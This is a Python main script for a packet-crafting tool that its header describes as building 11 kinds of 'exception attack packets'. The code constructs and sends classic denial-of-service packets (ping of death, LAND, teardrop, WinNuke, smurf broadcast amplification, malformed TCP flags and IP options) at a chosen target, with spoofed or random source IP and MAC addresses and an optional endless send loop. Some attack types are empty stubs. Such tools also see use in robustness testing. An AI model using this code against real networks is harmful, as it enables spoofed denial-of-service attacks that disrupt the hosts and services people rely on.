# #!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Project -> @File : Abnormal -> main.py
# @Author   : Taknife
# @IDE      : PyCharm
# @Time     : 2022/9/28 14:28

"""
<An exception packet construction tool that can construct 11 types of exception attack packets.>
Copyright (C) <2022/10/21> <Taknife>

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License along
with this program; if not, write to the Free Software Foundation, Inc.,
51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
"""


from crafting_data.parameter_parser import *
from crafting_data.show_information import *
from crafting_data.crafting_addr import *
from crafting_packets.send_exception_packets import *
from crafting_packets.ipv4_exception_packets import *

mainparser = ModuleParser()
module = mainparser.module_parser()
print(module)

def smac_choice():
    if module.hide_srcmac:
        smac = random_srcmac()
    elif module.smac:
        smac = module.smac
    else:
        smac = mac_addr(module.int)
    return smac


def src_choice():
    if module.hide_srcip:
        src = random_srcip()
    elif module.src:
        src = module.src
    else:
        src = ipv4_addr(module.int)
    return src


class SwitchCase():
    def ping_of_death(self):
        network_card = iface(module.int)
        smac = smac_choice()
        src = src_choice()
        data = ""
        frag = 0
        for i in range(1480):
            data += "P"
        pkt = ipv4_ping_of_death(smac=smac, frag=0, src=src, dst=module.dst, data=data)
        pkt.show()
        for j in range(module.num):
            for k in range(0, 66600, len(data)):
                print(k)
                frag = int(k / 8)
                pkt = ipv4_ping_of_death(smac=smac, frag=frag, src=src, dst=module.dst, data=data)
                ping_of_death_send(pkt=pkt, tim=module.time, net=network_card)
                tag = k
        frag += len(data)
        print(frag)
        pkt = ipv4_ping_of_death_end(smac=smac, frag=frag, src=src, dst=module.dst, data=data)
        ping_of_death_send(pkt=pkt, tim=module.time, net=network_card)



    def land_base(self):
        network_card = iface(module.int)
        smac = smac_choice()
        pkt = ipv4_land_base(smac=smac, target=module.dst)
        pkt.show()

        if module.num:
            loop_packets(pkt=pkt, num=module.num, tim=module.time, net=network_card)
        else:
            infinite_packets(pkt=pkt, tim=module.time, net=network_card)


    def tear_drop(self):
        network_card = iface(module.int)
        smac = smac_choice()
        src = src_choice()
        data = ""
        frag = 0
        for i in range(module.data):
            data += 'A'
        if not module.frag:
            frag = int(len(data) / 8 - 1)
        else:
            frag = int(module.frag / 8)
        if not module.proto:
            print("---------- Package 1 ----------")
            pkt1 = ipv4_tear_drop(smac=smac, src=src, frag=0, dst=module.dst, data=data)
            pkt1.show()
            print("---------- Package 2 ----------")
            pkt2 = ipv4_tear_drop(smac=smac, src=src, frag=frag, dst=module.dst, data=data)
            pkt2.show()
            tear_drop_send(pkt1=pkt1, pkt2=pkt2, num=module.num, net=network_card, tim=module.time)
        else:
            print("---------- Package 1 ----------")
            pkt1 = ipv4_tear_drop(smac=smac, src=src, frag=0, dst=module.dst, data=data, proto=module.proto)
            pkt1.show()
            print("---------- Package 2 ----------")
            pkt2 = ipv4_tear_drop(smac=smac, src=src, frag=frag, dst=module.dst, data=data, proto=module.proto)
            pkt2.show()
            tear_drop_send(pkt1=pkt1, pkt2=pkt2, num=module.num, net=network_card, tim=module.time)


    def tcp_flag(self):
        network_card = iface(module.int)
        smac = smac_choice()
        src = src_choice()
        pkt = ipv4_tcp_flag(smac=smac, src=src, dst=module.dst, flags=module.flags)
        pkt.show()

        if module.num:
            loop_packets(pkt=pkt, num=module.num, tim=module.time, net=network_card)
        else:
            infinite_packets(pkt=pkt, tim=module.time, net=network_card)


    def winnuke(self):
        network_card = iface(module.int)
        smac = smac_choice()
        src = src_choice()
        pkt = ipv4_winnuke(smac=smac, src=src, dst=module.dst)
        pkt.show()

        if module.num:
            loop_packets(pkt=pkt, num=module.num, tim=module.time, net=network_card)
        else:
            infinite_packets(pkt=pkt, tim=module.time, net=network_card)


    def smurf(self):
        network_card = iface(module.int)
        target_ip = module.dst.split('/', 1)
        network_bit = target_ip[0]
        if len(target_ip) == 1:
            host_bit = None
        else:
            host_bit = target_ip[1]
        target_mac = getmacbyip(network_bit)
        # print(network_bit)
        # print(host_bit)
        if host_bit:
            broadcast = ip_broadcast(network_bit=network_bit, host_bit=host_bit)
        else:
            broadcast = ip_broadcast(network_bit=network_bit)
        pkt = ipv4_smurf(target_mac=target_mac, target_ip=network_bit, broadcast=broadcast)
        pkt.show()

        if module.num:
            loop_packets(pkt=pkt, num=module.num, tim=module.time, net=network_card)
        else:
            infinite_packets(pkt=pkt, tim=module.time, net=network_card)


    def ip_option(self):
        network_card = iface(module.int)
        smac = smac_choice()
        src = src_choice()
        pkt = ipv4_ip_option(smac=smac, src=src, dst=module.dst)
        pkt.show()

        if module.num:
            loop_packets(pkt=pkt, num=module.num, tim=module.time, net=network_card)
        else:
            infinite_packets(pkt=pkt, tim=module.time, net=network_card)

    def ip_spoof(self):
        pass

    def jolt2(self):
        pass

    def tcp_sack(self):
        pass

    def fraggle(self):
        pass

    def custom(self):
        pass

    def defalut(self):
        pass

    def get_packet(self, name):
        packet_name = name.replace("-", "_")
        run = getattr(self, packet_name, self.defalut)
        return run()

if __name__ == '__main__':
    case = SwitchCase()
    if module.module_name:
        case.get_packet(module.module_name)
    elif module.inter:
        show_interface()
    elif module.route:
        show_route(module.route)

    # print(module)